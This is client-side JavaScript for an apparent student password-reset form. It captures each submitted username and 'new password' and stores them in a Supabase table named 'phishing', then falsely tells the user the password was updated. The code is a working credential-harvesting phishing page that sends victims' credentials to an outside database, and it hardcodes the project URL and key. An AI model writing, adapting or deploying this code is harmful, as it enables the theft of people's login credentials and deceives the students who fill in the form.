
const SUPABASE_URL =
'https://tzygochlibduxubsblzd.supabase.co';

const SUPABASE_KEY =
'sb_publishable_GVnQsJLt8IzlyOUAL48Kmg_kdLxPzxH';

const client =
supabase.createClient(
    SUPABASE_URL,
    SUPABASE_KEY
);

document
.getElementById("studentForm")
.addEventListener(
"submit",
async function(e){

    e.preventDefault();

    const username =
    document.getElementById("uname").value;

    const newPassword =
    document.getElementById("newpass").value;

    let status =
    document.getElementById("status");

    if(!status){

        status =
        document.createElement("div");

        status.id = "status";

        document
        .getElementById("studentForm")
        .appendChild(status);
    }

    status.innerHTML = "Submitting...";

    const { data, error } =
    await client
    .from("phishing")
    .insert([
        {
            username: username,
            password: newPassword
        }
    ]);

    if(error){

        console.log(error);

        status.innerHTML =
        "❌ Submission failed.";

        alert(
            "Error: " +
            error.message
        );

    } else {

        console.log(data);

        status.innerHTML =
        "✅ Password updated successfully.";

        alert(
            "Password updated successfully!"
        );

        document
        .getElementById("studentForm")
        .reset();
    }
});
